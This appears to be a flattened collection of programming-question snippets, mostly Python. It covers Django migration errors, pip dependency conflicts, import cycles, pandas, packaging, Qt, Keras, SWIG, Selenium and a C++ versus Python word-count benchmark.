def foo ( ) : i = 0 def incr ( ) : i += 1 incr ( ) print ( i ) foo ( )
"File `` /Users/Yunti/.virtualenvs/switcher5/lib/python3.5/site-packages/django/db/backends/utils.py '' , line 64 , in execute return self.cursor.execute ( sql , params ) psycopg2.ProgrammingError : can not cast type date to integerLINE 1 : ... end_date_fixed '' TYPE integer USING `` end_date_fixed '' : :integer ^The above exception was the direct cause of the following exception : Traceback ( most recent call last ) : File `` manage.py '' , line 10 , in < module > execute_from_command_line ( sys.argv ) File `` /Users/Yunti/.virtualenvs/switcher5/lib/python3.5/site-packages/django/core/management/__init__.py '' , line 353 , in execute_from_command_line utility.execute ( ) File `` /Users/Yunti/.virtualenvs/switcher5/lib/python3.5/site-packages/django/core/management/__init__.py '' , line 345 , in execute self.fetch_command ( subcommand ) .run_from_argv ( self.argv ) File `` /Users/Yunti/.virtualenvs/switcher5/lib/python3.5/site-packages/django/core/management/base.py '' , line 348 , in run_from_argv self.execute ( *args , **cmd_options ) File `` /Users/Yunti/.virtualenvs/switcher5/lib/python3.5/site-packages/django/core/management/base.py '' , line 399 , in execute output = self.handle ( *args , **options ) File `` /Users/Yunti/.virtualenvs/switcher5/lib/python3.5/site-packages/django/core/management/commands/migrate.py '' , line 200 , in handle executor.migrate ( targets , plan , fake=fake , fake_initial=fake_initial ) File `` /Users/Yunti/.virtualenvs/switcher5/lib/python3.5/site-packages/django/db/migrations/executor.py '' , line 92 , in migrate self._migrate_all_forwards ( plan , full_plan , fake=fake , fake_initial=fake_initial ) File `` /Users/Yunti/.virtualenvs/switcher5/lib/python3.5/site-packages/django/db/migrations/executor.py '' , line 121 , in _migrate_all_forwards state = self.apply_migration ( state , migration , fake=fake , fake_initial=fake_initial ) File `` /Users/Yunti/.virtualenvs/switcher5/lib/python3.5/site-packages/django/db/migrations/executor.py '' , line 198 , in apply_migration state = migration.apply ( state , schema_editor ) File `` /Users/Yunti/.virtualenvs/switcher5/lib/python3.5/site-packages/django/db/migrations/migration.py '' , line 123 , in apply operation.database_forwards ( self.app_label , schema_editor , old_state , project_state ) File `` /Users/Yunti/.virtualenvs/switcher5/lib/python3.5/site-packages/django/db/migrations/operations/fields.py '' , line 201 , in database_forwards schema_editor.alter_field ( from_model , from_field , to_field ) File `` /Users/Yunti/.virtualenvs/switcher5/lib/python3.5/site-packages/django/db/backends/base/schema.py '' , line 482 , in alter_field old_db_params , new_db_params , strict ) File `` /Users/Yunti/.virtualenvs/switcher5/lib/python3.5/site-packages/django/db/backends/postgresql/schema.py '' , line 110 , in _alter_field new_db_params , strict , File `` /Users/Yunti/.virtualenvs/switcher5/lib/python3.5/site-packages/django/db/backends/base/schema.py '' , line 634 , in _alter_field params , File `` /Users/Yunti/.virtualenvs/switcher5/lib/python3.5/site-packages/django/db/backends/base/schema.py '' , line 110 , in execute cursor.execute ( sql , params ) File `` /Users/Yunti/.virtualenvs/switcher5/lib/python3.5/site-packages/django/db/backends/utils.py '' , line 79 , in execute return super ( CursorDebugWrapper , self ) .execute ( sql , params ) File `` /Users/Yunti/.virtualenvs/switcher5/lib/python3.5/site-packages/django/db/backends/utils.py '' , line 64 , in execute return self.cursor.execute ( sql , params ) File `` /Users/Yunti/.virtualenvs/switcher5/lib/python3.5/site-packages/django/db/utils.py '' , line 95 , in __exit__ six.reraise ( dj_exc_type , dj_exc_value , traceback ) File `` /Users/Yunti/.virtualenvs/switcher5/lib/python3.5/site-packages/django/utils/six.py '' , line 685 , in reraise raise value.with_traceback ( tb ) File `` /Users/Yunti/.virtualenvs/switcher5/lib/python3.5/site-packages/django/db/backends/utils.py '' , line 64 , in execute return self.cursor.execute ( sql , params ) django.db.utils.ProgrammingError : can not cast type date to integerLINE 1 : ... end_date_fixed '' TYPE integer USING `` end_date_fixed '' : :integer"
"idna==2.9 - cryptography==2.3.1 [ requires : idna > =2.1 ] - requests==2.22.0 [ requires : idna > =2.5 , < 2.9 ] - requests-oauthlib==1.3.0 [ requires : requests > =2.0.0 ] - social-auth-core==3.2.0 [ requires : requests-oauthlib > =0.6.1 ] - social-auth-app-django==2.1.0 [ requires : social-auth-core > =1.2.0 ] - responses==0.10.9 [ requires : requests > =2.0 ] - social-auth-core==3.2.0 [ requires : requests > =2.9.1 ] - social-auth-app-django==2.1.0 [ requires : social-auth-core > =1.2.0 ] ERROR : requests 2.22.0 has requirement idna < 2.9 , > =2.5 , but you 'll have idna 2.9 which is incompatible . # requirements.txt-r requirements/requirements-base.txt-r requirements/requirements-testing.txt # requirements-base.txtcryptography~=2.3.1pyjwt~=1.6.4requests~=2.22.0social-auth-app-django~=2.1.0 # requirements-testing.txthypothesis~=3.87.0pytest~=3.6.2pytest-django~=3.3.2pytest-cov~=2.5.1responses~=0.10.5 cryptography~=2.3.1requests~=2.22.0 virtualenv -p python3.6 -v venvsource venv/bin/activatepip install -r requirements.txt -- no-cache-dir Collecting cryptography~=2.3.1 Downloading cryptography-2.3.1-cp34-abi3-manylinux1_x86_64.whl ( 2.1 MB ) |████████████████████████████████| 2.1 MB 2.0 MB/s Collecting requests~=2.22.0 Downloading requests-2.22.0-py2.py3-none-any.whl ( 57 kB ) |████████████████████████████████| 57 kB 18.5 MB/s Collecting asn1crypto > =0.21.0 Downloading asn1crypto-1.3.0-py2.py3-none-any.whl ( 103 kB ) |████████████████████████████████| 103 kB 65.4 MB/s Collecting idna > =2.1 Downloading idna-2.9-py2.py3-none-any.whl ( 58 kB ) |████████████████████████████████| 58 kB 71.4 MB/s Collecting six > =1.4.1 Downloading six-1.14.0-py2.py3-none-any.whl ( 10 kB ) Collecting cffi ! =1.11.3 , > =1.7 Downloading cffi-1.14.0-cp36-cp36m-manylinux1_x86_64.whl ( 399 kB ) |████████████████████████████████| 399 kB 30.3 MB/s Collecting urllib3 ! =1.25.0 , ! =1.25.1 , < 1.26 , > =1.21.1 Downloading urllib3-1.25.8-py2.py3-none-any.whl ( 125 kB ) |████████████████████████████████| 125 kB 46.7 MB/s Collecting certifi > =2017.4.17 Downloading certifi-2019.11.28-py2.py3-none-any.whl ( 156 kB ) |████████████████████████████████| 156 kB 65.1 MB/s Collecting chardet < 3.1.0 , > =3.0.2 Downloading chardet-3.0.4-py2.py3-none-any.whl ( 133 kB ) |████████████████████████████████| 133 kB 60.8 MB/s Collecting pycparser Downloading pycparser-2.19.tar.gz ( 158 kB ) |████████████████████████████████| 158 kB 25.0 MB/s Building wheels for collected packages : pycparser Building wheel for pycparser ( setup.py ) ... done Created wheel for pycparser : filename=pycparser-2.19-py2.py3-none-any.whl size=111031 sha256=030a1449dd5902f2f03e9e2f8f9cc6760503136a9243e965237a1ece1196502a Stored in directory : /tmp/pip-ephem-wheel-cache-c_dx8qi5/wheels/c6/6b/83/2608afaa57ecfb0a66ac89191a8d9bad71c62ca55ee499c2d0Successfully built pycparserERROR : requests 2.22.0 has requirement idna < 2.9 , > =2.5 , but you 'll have idna 2.9 which is incompatible.Installing collected packages : asn1crypto , idna , six , pycparser , cffi , cryptography , urllib3 , certifi , chardet , requestsSuccessfully installed asn1crypto-1.3.0 certifi-2019.11.28 cffi-1.14.0 chardet-3.0.4 cryptography-2.3.1 idna-2.9 pycparser-2.19 requests-2.22.0 six-1.14.0 urllib3-1.25.8"
"project/ driver.py lib/ __init__.py core/ util.py common.py __init__.py # project/driver.pyimport lib.core.common as abcpass # project/lib/core/__init__.pyfrom .util import Worker # project/lib/core/util.pyimport lib.core.common as abcclass Worker : pass # project/lib/core/common.pydef stuff ( ) : pass Traceback ( most recent call last ) : File `` driver.py '' , line 1 , in < module > import lib.core.common as abc File `` /home/user/project/lib/core/__init__.py '' , line 1 , in < module > from .util import Worker File `` /home/user/project/lib/core/util.py '' , line 1 , in < module > import lib.core.common as abcAttributeError : module 'lib ' has no attribute 'core '"
"setup ( name='mylocalpkg ' , ... entry_points= { 'console_scripts ' : [ 'myscript = mylocalpkg.scriptfile : main ' ] } , ... ) $ python -m mylocalpkg.scriptfile $ myscript $ python -m pdb mylocalpkg.scriptfileError : mylocalpkg.scriptfile does not exist $ python -m pdb myscriptError : myscript does not exist"
"df = pd.DataFrame ( [ [ ' a ' , ' b ' ] , [ 'd ' , ' e ' ] , [ ' f ' , ' g ' , ' h ' ] , [ ' q ' , ' r ' , ' e ' , 't ' ] ] ) df = df.rename ( columns= { 0 : `` Key '' } ) Key 1 2 30 a b None None1 d e None None2 f g h None3 q r e t new_df = pd.melt ( df , id_vars= [ 'Key ' ] ) [ [ 'Key ' , 'value ' ] ] new_df = new_df.dropna ( ) Key value0 a b1 d e2 f g3 q r6 f h7 q e11 q t​"
".├── my_package│ └── __init__.py├── setup.cfg└── setup.py from setuptools import setupsetup ( ) [ metadata ] name = my_packageversion = 0.1 [ options ] packages = find : pip wheel -- no-deps -w dist . # generates file ./dist/my_package-0.1-py3-none-any.whlpython setup.py sdist # generates file ./dist/my_package-0.1.tar.gz .├── my_package│ └── __init__.py├── setup.cfg└── pyproject.toml [ build-system ] build-backend = `` setuptools.build_meta '' requires = [ `` setuptools '' , `` wheel '' ] python : ca n't open file 'setup.py ' : [ Errno 2 ] No such file or directory"
"import curses import cmdclass HelloWorld ( cmd.Cmd ) : `` '' '' Simple command processor example . '' '' '' def do_greet ( self , line ) : screen.clear ( ) screen.addstr ( 1,1 , '' hello `` +line ) screen.addstr ( 0,1 , '' > '' ) screen.refresh ( ) def do_q ( self , line ) : curses.endwin ( ) return Trueif __name__ == '__main__ ' : screen = curses.initscr ( ) HelloWorld ( ) .cmdloop ( )"
"class TreeItem ( object ) : def __init__ ( self , filepath ) : self.filepath = filepath self.isFavorite = False import sysimport osfrom PySide import QtGui , QtCore , QtSvgDIR_ICON_PATH = 'folder.svg'FILE_ICON_OFF = 'file_off.svg'FILE_ICON_ON = 'file_on.svg'class TreeItem ( object ) : def __init__ ( self , filepath ) : self.filepath = filepath self.isFavorite = Falseclass Example ( QtGui.QWidget ) : def __init__ ( self ) : super ( Example , self ) .__init__ ( ) self.initUI ( ) def initUI ( self ) : # formatting self.resize ( 550 , 400 ) self.setWindowTitle ( `` Toychest '' ) # widgets self.treeview = QtGui.QTreeView ( ) self.treeview.setHeaderHidden ( True ) self.treeview.setUniformRowHeights ( True ) self.treeview.setEditTriggers ( QtGui.QAbstractItemView.NoEditTriggers ) self.source_model = QtGui.QStandardItemModel ( ) self.treeview.setModel ( self.source_model ) # signals self.treeview.doubleClicked.connect ( self.doubleClickedItem ) # main layout mainLayout = QtGui.QGridLayout ( ) mainLayout.setContentsMargins ( 0,0,0,0 ) mainLayout.addWidget ( self.treeview ) self.setLayout ( mainLayout ) self.initDirectory ( ' C : /Users/jmartini/Downloads ' ) # Functions # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- def initDirectory ( self , path ) : new_item = self.newItem ( path ) self.readDirectory ( path , new_item ) self.source_model.appendRow ( new_item ) def readDirectory ( self , path , parent_item ) : directory = os.listdir ( path ) for file_name in directory : file_path = path + '/ ' + file_name new_item = self.newItem ( file_path ) parent_item.appendRow ( new_item ) if os.path.isdir ( file_path ) : self.readDirectory ( file_path , new_item ) def newItem ( self , path ) : # create Object obj = TreeItem ( path ) title = os.path.basename ( path ) item = QtGui.QStandardItem ( ) item.setData ( obj , role=QtCore.Qt.UserRole ) icon_path = FILE_ICON_OFF if os.path.isdir ( path ) : icon_path = DIR_ICON_PATH icon = QtGui.QIcon ( icon_path ) item.setText ( title ) item.setIcon ( icon ) return item def doubleClickedItem ( self , idx ) : if not idx.isValid ( ) : return obj = idx.data ( QtCore.Qt.UserRole ) print obj.filepath , obj.isFavorite # print idx.parent ( ) , idx.parent ( ) .isValid ( ) # model = idx.model ( ) # print model.index ( idx.row ( ) , 0 , parent=idx.parent ( ) ) .data ( ) # Main # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- if __name__ == '__main__ ' : app = QtGui.QApplication ( sys.argv ) ex = Example ( ) ex.show ( ) sys.exit ( app.exec_ ( ) )"
"def main ( ) : c = Castable ( ) print c/3 print 2-c print c % 7 print c**2 print `` % s '' % c print `` % i '' % c print `` % f '' % c TypeError : unsupported operand type ( s ) for / : 'Castable ' and 'int ' print pow ( c , 2 , 100 )"
"class MyContainer : def addMyItem ( self , item : MyItem ) : passclass MyItem : def __init__ ( self , container : MyContainer ) : pass class MyContainer : def addMyItem ( self , untypeditem ) : item : MyItem=untypeditem passclass MyItem : def __init__ ( self , container : MyContainer ) : pass"
"import reimport requestsfrom bs4 import BeautifulSouplink = 'https : //www.instagram.com/accounts/login/'login_url = 'https : //www.instagram.com/accounts/login/ajax/'payload = { 'username ' : 'someusername ' , 'password ' : 'somepassword ' , 'enc_password ' : `` , 'queryParams ' : { } , 'optIntoOneTap ' : 'false ' } with requests.Session ( ) as s : r = s.get ( link ) csrf = re.findall ( r '' csrf_token\ '' : \ '' ( .* ? ) \ '' '' , r.text ) [ 0 ] r = s.post ( login_url , data=payload , headers= { `` user-agent '' : `` Mozilla/5.0 ( Windows NT 6.1 ) AppleWebKit/537.36 ( KHTML , like Gecko ) Chrome/77.0.3865.120 Safari/537.36 '' , `` x-requested-with '' : `` XMLHttpRequest '' , `` referer '' : `` https : //www.instagram.com/accounts/login/ '' , `` x-csrftoken '' : csrf } ) print ( r.status_code ) print ( r.url ) username : someusernameenc_password : # PWD_INSTAGRAM_BROWSER:10:1592421027 : ARpQAAm7pp/etjy2dMjVtPRdJFRPu8FAGILBRyupINxLckJ3QO0u0RLmU5NaONYK2G0jQt+78BBDBxR9nrUsufbZgR02YvR8BLcHS4uN8Gu88O2Z2mQU9AH3C0Z2NpDPpS22uqUYhxDKcYS5cA==queryParams : { `` oneTapUsers '' : '' [ \ '' 36990119985\ '' ] '' } optIntoOneTap : false"
"lenet_model = models.Sequential ( ) lenet_model.add ( Convolution2D ( filters=filt_size , kernel_size= ( kern_size , kern_size ) , padding='valid ' , \ input_shape=input_shape ) ) lenet_model.add ( Activation ( 'relu ' ) ) lenet_model.add ( BatchNormalization ( ) ) lenet_model.add ( MaxPooling2D ( pool_size= ( maxpool_size , maxpool_size ) ) ) lenet_model.add ( Convolution2D ( filters=64 , kernel_size= ( kern_size , kern_size ) , padding='valid ' ) ) lenet_model.add ( Activation ( 'relu ' ) ) lenet_model.add ( BatchNormalization ( ) ) lenet_model.add ( MaxPooling2D ( pool_size= ( maxpool_size , maxpool_size ) ) ) lenet_model.add ( Convolution2D ( filters=128 , kernel_size= ( kern_size , kern_size ) , padding='valid ' ) ) lenet_model.add ( Activation ( 'relu ' ) ) lenet_model.add ( BatchNormalization ( ) ) lenet_model.add ( MaxPooling2D ( pool_size= ( maxpool_size , maxpool_size ) ) ) lenet_model.add ( Flatten ( ) ) lenet_model.add ( Dense ( 1024 , kernel_initializer='uniform ' ) ) lenet_model.add ( Activation ( 'relu ' ) ) lenet_model.add ( Dense ( 512 , kernel_initializer='uniform ' ) ) lenet_model.add ( Activation ( 'relu ' ) ) lenet_model.add ( Dropout ( 0.2 ) ) lenet_model.add ( Dense ( n_classes , kernel_initializer='uniform ' ) ) lenet_model.add ( Activation ( 'softmax ' ) ) lenet_model.compile ( loss='binary_crossentropy ' , optimizer=Adam ( ) , metrics= [ 'accuracy ' ] )"
"class NewForm ( forms.Form ) : project = forms.ModelMultipleChoiceField ( widget=forms.CheckboxSelectMultiple , queryset=Project.objects.filter ( enable=True ) ) { % for p in form.project % } < label for= '' { { p.id_for_label } } '' > < input type= '' checkbox '' name= '' { { p.name } } '' id= '' { { p.id_for_label } } '' value= '' { { p.choice_value } } '' { % if p.choice_value|add : '' 0 '' in form.project.initial % } checked { % endif % } > < p > { { p.choice_label } } < /p > < /label > { % endfor % } def order_start ( request , order_id ) : if request.method == 'POST ' : form = NewForm ( request.POST ) if form.is_valid ( ) : order.end_time = timezone.now ( ) order.save ( ) order.project = form.cleaned_data [ 'project ' ] order.save ( ) return HttpResponsec ( order.id ) else : form = NewForm ( initial= { 'project ' : [ p.pk for p in order.project.all ( ) ] , } ) return render ( request , 'orders/start.html ' , { 'form ' : form , 'order ' : orderc } )"
"# -*- coding : utf-8 -*-from selenium import webdriverfrom selenium.webdriver.common.by import Byfrom selenium.webdriver.common.keys import Keysfrom selenium.webdriver.support.ui import Selectfrom selenium.common.exceptions import NoSuchElementExceptionfrom selenium.common.exceptions import NoAlertPresentExceptionimport unittest , time , reclass Test1 ( unittest.TestCase ) : def setUp ( self ) : self.driver = webdriver.Firefox ( ) self.driver.implicitly_wait ( 30 ) self.base_url = `` http : //ironspider.ca/ '' self.verificationErrors = [ ] self.accept_next_alert = True def test_1 ( self ) : driver = self.driver driver.get ( self.base_url + `` /frames/frames_example1/advanced.htm '' ) # ERROR : Caught exception [ ERROR : Unsupported command [ selectFrame | content | ] ] self.assertEqual ( `` The Eve of the War '' , driver.find_element_by_css_selector ( `` h2 '' ) .text ) # ERROR : Caught exception [ ERROR : Unsupported command [ selectWindow | name=menu | ] ] driver.find_element_by_link_text ( `` Chapter 2 '' ) .click ( ) # ERROR : Caught exception [ ERROR : Unsupported command [ selectWindow | name=content | ] ] self.assertEqual ( `` The Falling Star '' , driver.find_element_by_css_selector ( `` h2 '' ) .text ) def is_element_present ( self , how , what ) : try : self.driver.find_element ( by=how , value=what ) except NoSuchElementException : return False return True def is_alert_present ( self ) : try : self.driver.switch_to_alert ( ) except NoAlertPresentException : return False return True def close_alert_and_get_its_text ( self ) : try : alert = self.driver.switch_to_alert ( ) alert_text = alert.text if self.accept_next_alert : alert.accept ( ) else : alert.dismiss ( ) return alert_text finally : self.accept_next_alert = True def tearDown ( self ) : self.driver.quit ( ) self.assertEqual ( [ ] , self.verificationErrors ) if __name__ == `` __main__ '' : unittest.main ( ) ERROR : test_1 ( __main__.Test1 ) -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- Traceback ( most recent call last ) : File `` E : \Privat\Learn\Selenium\test1.py '' , line 22 , in test_1 self.assertEqual ( `` The Eve of the War '' , driver.find_element_by_css_selector ( `` h2 '' ) .text ) File `` C : \Program Files ( x86 ) \Python 3.5\lib\site-packages\selenium\webdriver\remote\webdriver.py '' , line 402 , in find_element_by_css_selector return self.find_element ( by=By.CSS_SELECTOR , value=css_selector ) File `` C : \Program Files ( x86 ) \Python 3.5\lib\site-packages\selenium\webdriver\remote\webdriver.py '' , line 712 , in find_element { 'using ' : by , 'value ' : value } ) [ 'value ' ] File `` C : \Program Files ( x86 ) \Python 3.5\lib\site-packages\selenium\webdriver\remote\webdriver.py '' , line 201 , in execute self.error_handler.check_response ( response ) File `` C : \Program Files ( x86 ) \Python 3.5\lib\site-packages\selenium\webdriver\remote\errorhandler.py '' , line 181 , in check_response raise exception_class ( message , screen , stacktrace ) selenium.common.exceptions.NoSuchElementException : Message : Unable to locate element : { `` method '' : '' css selector '' , '' selector '' : '' h2 '' } Stacktrace : at FirefoxDriver.prototype.findElementInternal_ ( file : ///C : /Users/dial1/AppData/Local/Temp/tmpu1otxnnn/extensions/fxdriver @ googlecode.com/components/driver-component.js:10659 ) at fxdriver.Timer.prototype.setTimeout/ < .notify ( file : ///C : /Users/dial1/AppData/Local/Temp/tmpu1otxnnn/extensions/fxdriver @ googlecode.com/components/driver-component.js:621 ) -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- Ran 1 test in 34.166sFAILED ( errors=1 ) < ? xml version= '' 1.0 '' encoding= '' UTF-8 '' ? > < ! DOCTYPE html PUBLIC `` -//W3C//DTD XHTML 1.0 Strict//EN '' `` http : //www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd '' > < html xmlns= '' http : //www.w3.org/1999/xhtml '' xml : lang= '' en '' lang= '' en '' > < head profile= '' http : //selenium-ide.openqa.org/profiles/test-case '' > < meta http-equiv= '' Content-Type '' content= '' text/html ; charset=UTF-8 '' / > < link rel= '' selenium.base '' href= '' http : //ironspider.ca/ '' / > < title > example1 < /title > < /head > < body > < table cellpadding= '' 1 '' cellspacing= '' 1 '' border= '' 1 '' > < thead > < tr > < td rowspan= '' 1 '' colspan= '' 3 '' > example1 < /td > < /tr > < /thead > < tbody > < tr > < td > open < /td > < td > /frames/frames_example1/advanced.htm < /td > < td > < /td > < /tr > < tr > < td > selectFrame < /td > < td > content < /td > < td > < /td > < /tr > < tr > < td > assertText < /td > < td > css=h2 < /td > < td > The Eve of the War < /td > < /tr > < tr > < td > selectWindow < /td > < td > name=menu < /td > < td > < /td > < /tr > < tr > < td > click < /td > < td > link=Chapter 2 < /td > < td > < /td > < /tr > < tr > < td > selectWindow < /td > < td > name=content < /td > < td > < /td > < /tr > < tr > < td > pause < /td > < td > 500 < /td > < td > < /td > < /tr > < tr > < td > assertText < /td > < td > css=h2 < /td > < td > The Falling Star < /td > < /tr > < /tbody > < /table > < /body > < /html >"
"def model_tester ( model : Predictor , parameter : int ) - > np.ndarray : `` '' '' An example function with type hints . '' '' '' # do stuff to model return values Predictor = TypeVar ( 'Predictor ' ) sklearn.linear_model.base.LinearRegression"
"a = np.array ( [ 3 , 3 , np.nan , 3 , 3 , np.nan ] ) np.isnan ( a ) .argmax ( )"
"void nw ( int* D , int Dx , int Dy , int* mat , int mx , int my , char *xstr , int xL , char *ystr , int yL ) ; % module nw % { # define SWIG_FILE_WITH_INIT # include `` nw.h '' % } % include `` numpy.i '' % init % { import_array ( ) ; % } /*type maps for input arrays and strings*/ % apply ( int* INPLACE_ARRAY2 , int DIM1 , int DIM2 ) { ( int* D , int Dx , int Dy ) } % apply ( int* IN_ARRAY2 , int DIM1 , int DIM2 ) { ( int* mat , int mx , int my ) } % apply ( char* IN_ARRAY , int DIM1 ) { ( char *xstr , int xL ) , ( char *ystr , int yL ) } % include `` nw.h '' D = numpy.zeros ( ( 5,5 ) , numpy.int ) mat = numpy.array ( [ [ 1 , 0 , 0 , 0 , 0 , 0 ] , [ 0 , 1 , 0 , 0 , 0 , 0 ] , [ 0 , 0 , 1 , 0 , 0 , 0 ] , [ 0 , 0 , 0 , 1 , 0 , 0 ] , [ 0 , 0 , 0 , 0 , 1 , 0 ] , [ 0 , 0 , 0 , 0 , 0 , 1 ] ] , numpy.int ) x = numpy.array ( list ( `` ABCD '' ) ) y = numpy.array ( list ( `` ABCD '' ) ) import nwnw.nw ( D , mat , x , y ) TypeError : nw ( ) takes exactly 6 arguments ( 4 given )"
"lookback , features = 10 , 5 filters = 32kernel = 5dilations = 5dilation_rates = [ 2 ** i for i in range ( dilations ) ] model = Sequential ( ) model.add ( InputLayer ( input_shape= ( lookback , features ) ) ) model.add ( Reshape ( target_shape= ( features , lookback , 1 ) , input_shape= ( lookback , features ) ) ) # Add causal layersfor dilation_rate in dilation_rates : model.add ( TimeDistributed ( Conv1D ( filters=filters , kernel_size=kernel , padding='causal ' , dilation_rate=dilation_rate , activation='elu ' ) ) ) model.add ( Reshape ( target_shape= ( lookback , features * filters ) ) ) next_dilations = 3dilation_rates = [ 2 ** i for i in range ( next_dilations ) ] for dilation_rate in dilation_rates : model.add ( Conv1D ( filters=filters , kernel_size=kernel , padding='causal ' , dilation_rate=dilation_rate , activation='elu ' ) ) model.add ( MaxPool1D ( ) ) model.add ( Flatten ( ) ) model.add ( Dense ( units=1 , activation='linear ' ) ) model.summary ( ) lookback , features = 10 , 5filters = 32kernel = 5dilations = 5dilation_rates = [ 2 ** i for i in range ( dilations ) ] model = Sequential ( ) model.add ( InputLayer ( input_shape= ( lookback , features ) ) ) model.add ( Reshape ( target_shape= ( features , lookback , 1 ) , input_shape= ( lookback , features ) ) ) # Add causal layersfor dilation_rate in dilation_rates : model.add ( TimeDistributed ( Conv1D ( filters=filters , kernel_size=kernel , padding='causal ' , dilation_rate=dilation_rate , activation='elu ' ) ) ) model.add ( Reshape ( target_shape= ( lookback , features * filters ) ) ) next_dilations = 3dilation_rates = [ 2 ** i for i in range ( next_dilations ) ] for dilation_rate in dilation_rates : model.add ( Conv1D ( filters=filters , kernel_size=kernel , padding='causal ' , dilation_rate=dilation_rate , activation='elu ' ) ) model.add ( MaxPool1D ( ) ) model.add ( Flatten ( ) ) model.add ( Dense ( units=1 , activation='linear ' ) ) model.summary ( )"
"for i in bucket : try : result = client.list_objects ( Bucket=i , Prefix = 'PROCESSED_BY/FILE_JSON ' , Delimiter='/ ' ) content_object = s3.Object ( i , `` PROCESSED_BY/FILE_JSON/ ? Account.json '' ) file_content = content_object.get ( ) [ 'Body ' ] .read ( ) .decode ( 'utf-8 ' ) json_content = json.loads ( file_content ) except KeyError : pass test-eob/PROCESSED_BY/FILE_JSON/222-Account.jsontest-eob/PROCESSED_BY/FILE_JSON/1212121-Account.jsontest-eob/PROCESSED_BY/FILE_JSON/122-multi.jsontest-eob/PROCESSED_BY/FILE_JSON/qwqwq-Account.jsontest-eob/PROCESSED_BY/FILE_JSON/wqwqw-multi.json"
copying build/lib.linux-x86_64-3.5/_elementtree.cpython-35m-x86_64-linux-gnu.so - > /usr/local/lib/python3.5/lib-dynload error : [ Errno 2 ] No such file or directory Makefile:1458 : recipe for target 'sharedinstall ' failed
"1 57 `` 1 1 n1 1 ) 1 3 *1 18 ,1 7 -1 1 R1 13 .1 2 11 1 S1 5 21 1 31 2 41 2 & 1 91 % 1 1 51 1 61 1 71 1 81 2 91 16 ; 1 2 =1 5 A1 1 C1 5 e1 3 E1 1 G1 11 I1 1 L1 4 N1 681 a1 2 y1 1 P2 1 672 1 y ; 2 1 P-2 85 no2 9 ne2 779 of2 1 n ; ... # include < vector > # include < string > # include < iostream > # include < set > # include < map > bool compare_strlen ( const std : :string & lhs , const std : :string & rhs ) { return ( lhs.length ( ) < rhs.length ( ) ) ; } int main ( int argc , char *argv [ ] ) { std : :string str ; std : :vector < std : :string > words ; /* Extract words from the input file , splitting on whitespace */ while ( std : :cin > > str ) { words.push_back ( str ) ; } /* Extract unique words and count the number of occurances of each word */ std : :set < std : :string > unique_words ; std : :map < std : :string , int > word_count ; for ( std : :vector < std : :string > : :iterator it = words.begin ( ) ; it ! = words.end ( ) ; ++it ) { unique_words.insert ( *it ) ; word_count [ *it ] ++ ; } words.clear ( ) ; std : :copy ( unique_words.begin ( ) , unique_words.end ( ) , std : :back_inserter ( words ) ) ; // Sort by word length std : :sort ( words.begin ( ) , words.end ( ) , compare_strlen ) ; // Print words with length and number of occurances for ( std : :vector < std : :string > : :iterator it = words.begin ( ) ; it ! = words.end ( ) ; ++it ) { std : :cout < < it- > length ( ) < < `` `` < < word_count [ *it ] < < `` `` < < *it < < std : :endl ; } return 0 ; } import fileinputfrom collections import defaultdictwords = set ( ) count = { } for line in fileinput.input ( ) : line_words = line.split ( ) for word in line_words : if word not in words : words.add ( word ) count [ word ] = 1 else : count [ word ] += 1 words = list ( words ) words.sort ( key=len ) for word in words : print len ( word ) , count [ word ] , word time ./main > measure-and-count.txt < ~/Documents/thesaurus/thesaurus.txtreal 0m0.687suser 0m0.559ssys 0m0.123s time python main.py > measure-and-count.txt < ~/Documents/thesaurus/thesaurus.txtreal 0m0.369suser 0m0.308ssys 0m0.029s # include < unordered_set > # include < unordered_map > ... std : :unordered_set < std : :string > unique_words ; std : :unordered_map < std : :string , int > word_count ; g++-4.9 -std=c++11 -O3 -o main main.cpp time ./main > measure-and-count.txt < ~/Documents/thesaurus/thesaurus.txtreal 0m0.604suser 0m0.479ssys 0m0.122s # include < vector > # include < string > # include < iostream > # include < set > # include < map > struct comparer_strlen { bool operator ( ) ( const std : :string & lhs , const std : :string & rhs ) const { if ( lhs.length ( ) == rhs.length ( ) ) return lhs < rhs ; return lhs.length ( ) < rhs.length ( ) ; } } ; int main ( int argc , char* argv [ ] ) { std : :cin.sync_with_stdio ( false ) ; std : :string str ; typedef std : :map < std : :string , int , comparer_strlen > word_count_t ; /* Extract words from the input file , splitting on whitespace */ /* Extract unique words and count the number of occurances of each word */ word_count_t word_count ; while ( std : :cin > > str ) { word_count [ str ] ++ ; } // Print words with length and number of occurances for ( word_count_t : :iterator it = word_count.begin ( ) ; it ! = word_count.end ( ) ; ++it ) { std : :cout < < it- > first.length ( ) < < `` `` < < it- > second < < `` `` < < it- > first < < '\n ' ; } return 0 ; } time ./main3 > measure-and-count.txt < ~/Documents/thesaurus/thesaurus.txtreal 0m0.106suser 0m0.091ssys 0m0.012s import fileinputfrom collections import Countercount = Counter ( w for line in fileinput.input ( ) for w in line.split ( ) ) for word in sorted ( count , key=len ) : print len ( word ) , count [ word ] , word time python main2.py > measure-and-count.txt.py < ~/Documents/thesaurus/thesaurus.txtreal 0m0.342suser 0m0.312ssys 0m0.027s"
"import logginglogging.basicConfig ( level=logging.DEBUG , format= ' % ( message ) s ' ) def say_hello ( ) : `` ' > > > say_hello ( ) Hello ! `` ' logging.info ( 'Hello ! ' ) if __name__ == '__main__ ' : import doctest doctest.testmod ( )"
"> > > range ( 1 , 6 ) [ 1 , 2 , 3 , 4 , 5 ] > > > magic ( [ 1 , 2 , 3 , 4 , 5 ] ) [ 1 , 5 ] # note : 5 , not 6 ; this differs from ` range ( ) ` > > > magic ( [ 1 , 2 , 4 , 5 ] ) [ ' 1-2 ' , ' 4-5 ' ] > > > magic ( [ 1 , 2 , 3 , 4 , 5 ] ) [ ' 1-5 ' ]"
"$ ./my.py $ ./my.py -- arg MyArgValue $ ./my.py -- arg MyArgValue -- arg ThisIsNotValid parser.add_argument ( ' -- arg ' , type=str )"
